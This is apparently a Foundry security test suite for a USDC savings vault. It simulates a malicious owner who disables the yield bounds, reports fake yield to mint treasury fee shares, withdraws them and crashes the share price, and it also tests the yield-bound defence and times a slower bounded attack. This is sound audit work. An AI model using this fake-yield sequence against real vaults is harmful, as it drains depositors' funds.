// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {USDCSavingsVault} from "../../src/USDCSavingsVault.sol";
import {RoleManager} from "../../src/RoleManager.sol";
import {MockUSDC} from "../mocks/MockUSDC.sol";

/**
 * @title GovernanceAttack
 * @notice Simulates malicious owner exploiting yield reporting
 * @dev Tests the trust assumption in STATEMENT D.2
 */
contract GovernanceAttack is Test {
    USDCSavingsVault vault;
    RoleManager roleManager;
    MockUSDC usdc;

    address maliciousOwner = address(this);
    address operator = makeAddr("operator");
    address treasury = makeAddr("treasury");
    address victim1 = makeAddr("victim1");
    address victim2 = makeAddr("victim2");

    function setUp() public {
        usdc = new MockUSDC();
        roleManager = new RoleManager(maliciousOwner);
        vault = new USDCSavingsVault(
            address(usdc),
            address(roleManager),
            makeAddr("multisig"),
            treasury,
            0.2e18, // 20% fee
            1 days,
            "Test Vault",
            "TV"
        );
        roleManager.setOperator(operator, true);
        vault.setWithdrawalBuffer(type(uint256).max);

        // Victims deposit
        usdc.mint(victim1, 1_000_000e6);
        usdc.mint(victim2, 1_000_000e6);

        vm.prank(victim1);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(victim1);
        vault.deposit(1_000_000e6);

        vm.prank(victim2);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(victim2);
        vault.deposit(1_000_000e6);
    }

    function test_EXPLOIT_UnboundedYieldManipulation() public {
        console2.log("=== UNBOUNDED YIELD MANIPULATION ===");
        console2.log("");
        console2.log("Attack: Owner disables yield bounds and manipulates");
        console2.log("");

        uint256 initialNav = vault.totalAssets();
        uint256 initialPrice = vault.sharePrice();
        console2.log("Initial NAV:", initialNav);
        console2.log("Initial price:", initialPrice);
        console2.log("Treasury shares:", vault.balanceOf(treasury));

        // Step 1: Malicious owner disables yield bounds
        console2.log("");
        console2.log("Step 1: Owner disables yield bounds");
        vault.setMaxYieldChangePercent(0); // DANGEROUS!
        console2.log("  maxYieldChangePercent set to 0 (unlimited)");

        // Step 2: Report massive fake yield
        console2.log("");
        console2.log("Step 2: Report fake +1000% yield");
        vm.warp(block.timestamp + 1 days + 1);
        vault.reportYieldAndCollectFees(int256(initialNav * 10)); // +1000%

        uint256 priceAfterFakeYield = vault.sharePrice();
        uint256 treasuryShares = vault.balanceOf(treasury);
        console2.log("  Price after fake yield:", priceAfterFakeYield);
        console2.log("  Treasury shares minted:", treasuryShares);
        console2.log("  Treasury value:", vault.sharesToUsdc(treasuryShares));

        // Step 3: Treasury withdraws
        console2.log("");
        console2.log("Step 3: Treasury extracts value");
        vm.prank(treasury);
        vault.requestWithdrawal(treasuryShares);

        vm.warp(block.timestamp + 1 days + 1);

        // Report negative yield to crash price
        console2.log("");
        console2.log("Step 4: Owner reports -90% yield (crash)");
        vault.reportYieldAndCollectFees(-int256(vault.totalAssets() * 90 / 100));

        uint256 finalPrice = vault.sharePrice();
        console2.log("  Price after crash:", finalPrice);

        // Fulfill treasury withdrawal
        vm.prank(operator);
        (, uint256 treasuryPaid) = vault.fulfillWithdrawals(1);

        console2.log("");
        console2.log("=== DAMAGE ASSESSMENT ===");
        console2.log("Treasury extracted:", treasuryPaid);

        uint256 victim1Value = vault.sharesToUsdc(vault.balanceOf(victim1));
        uint256 victim2Value = vault.sharesToUsdc(vault.balanceOf(victim2));
        console2.log("Victim1 remaining value:", victim1Value);
        console2.log("Victim2 remaining value:", victim2Value);
        console2.log("");
        console2.log("Victim1 loss:", 1_000_000e6 - victim1Value);
        console2.log("Victim2 loss:", 1_000_000e6 - victim2Value);

        console2.log("");
        console2.log("EXPLOIT STATUS: SUCCESS (requires malicious owner)");
        console2.log("MITIGATION: Trust assumption documented in STATEMENT D.2");
    }

    function test_DEFEND_YieldBoundsProtection() public {
        console2.log("=== YIELD BOUNDS PROTECTION ===");
        console2.log("");
        console2.log("Default maxYieldChangePercent: 1% of NAV");
        console2.log("");

        uint256 nav = vault.totalAssets();
        uint256 maxAllowed = (nav * vault.maxYieldChangePercent()) / 1e18;
        console2.log("NAV:", nav);
        console2.log("Max allowed yield change:", maxAllowed);

        // Try to report excessive yield
        console2.log("");
        console2.log("Attempting to report +10% yield...");
        vm.warp(block.timestamp + 1 days + 1);

        int256 excessiveYield = int256(nav * 10 / 100); // 10%
        vm.expectRevert(USDCSavingsVault.YieldChangeTooLarge.selector);
        vault.reportYieldAndCollectFees(excessiveYield);

        console2.log("REVERTED: YieldChangeTooLarge");
        console2.log("");
        console2.log("DEFENSE EFFECTIVE when bounds enabled");
    }

    function test_TIMELINE_FullExploitWithBounds() public {
        console2.log("=== BOUNDED YIELD ATTACK (SLOW) ===");
        console2.log("");
        console2.log("With 1% daily bounds, how long to steal 50%?");
        console2.log("");

        uint256 daysNeeded = 0;
        uint256 totalFeeShares = 0;
        uint256 initialNav = vault.totalAssets();

        // Simulate many days of 1% fake yield
        while (vault.sharesToUsdc(vault.balanceOf(treasury)) < initialNav / 2) {
            vm.warp(block.timestamp + 1 days + 1);
            uint256 nav = vault.totalAssets();
            int256 maxYield = int256((nav * vault.maxYieldChangePercent()) / 1e18);
            vault.reportYieldAndCollectFees(maxYield);
            daysNeeded++;

            if (daysNeeded > 200) break; // Safety limit
        }

        uint256 treasuryValue = vault.sharesToUsdc(vault.balanceOf(treasury));
        console2.log("Days to steal 50% of NAV:", daysNeeded);
        console2.log("Treasury accumulated:", treasuryValue);
        console2.log("");
        console2.log("CONCLUSION: Attack takes", daysNeeded, "days");
        console2.log("Users have ample time to notice and exit");
    }
}
